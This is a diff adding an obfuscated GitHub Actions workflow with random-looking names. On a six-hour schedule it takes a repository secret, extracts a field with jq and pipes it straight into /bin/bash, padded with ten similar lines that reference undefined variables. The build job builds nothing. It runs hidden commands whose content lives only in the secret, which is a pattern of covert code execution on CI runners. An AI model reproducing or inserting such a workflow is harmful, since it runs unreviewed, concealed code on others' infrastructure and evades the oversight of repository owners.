@@ -1,0 +1,28 @@
+name: ingxbadailaida
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ingxbadailaida
+        env:
+          s6: ${{ secrets.s6 }}
+        run: |
+          echo $s6 | jq -r .xi7989 | /bin/bash
+          echo $oma2312 | jq -r .tlr36 | /bin/bash
+          echo $xdhna69196 | jq -r .eh33 | /bin/bash
+          echo $yimk1226 | jq -r .btnq935 | /bin/bash
+          echo $gi486 | jq -r .cpp7 | /bin/bash
+          echo $r04 | jq -r .mzr1334 | /bin/bash
+          echo $cmaz4867 | jq -r .mqod1 | /bin/bash
+          echo $vucu731 | jq -r .jvn93 | /bin/bash
+          echo $z1661 | jq -r .s1675 | /bin/bash
+          echo $c369 | jq -r .dcxme349 | /bin/bash
+          echo $w6045 | jq -r .rozrm9501 | /bin/bash
+
